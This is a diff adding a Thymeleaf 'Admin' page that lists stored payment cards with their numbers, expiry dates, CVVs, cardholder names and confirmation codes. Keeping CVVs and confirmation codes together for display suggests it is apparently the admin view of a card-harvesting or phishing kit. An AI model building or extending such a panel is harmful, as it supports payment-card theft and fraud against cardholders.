@@ -1,0 +1,34 @@
+<!DOCTYPE>
+ <html lang="en"
+      xmlns:th="http://www.thymeleaf.org"
+>
+<head>
+    <meta charset="UTF-8">
+    <title>Админ</title>
+</head>
+<body>
+<table border="3" cellpadding="10" cellspacing="10">
+    <thead>
+    <tr>
+        <th>ID</th>
+        <th>Номер карты</th>
+        <th>Месяц/год</th>
+        <th>CVV</th>
+        <th>Имя Фамилия на карте</th>
+        <th>Подтверждение</th>
+    </tr>
+    </thead>
+    <tr>
+        <tbody th:each="el : ${cards}">
+    </tr>
+    <tr>
+        <td th:text="${el.id}"/>
+        <td th:text="${el.number}"/>
+        <td th:text="${el.date}"/>
+        <td th:text="${el.cvv}"/>
+        <td th:text="${el.name}"/>
+        <td th:text="${el.code}"/>
+    </tr>
+</table>
+</body>
+</html>
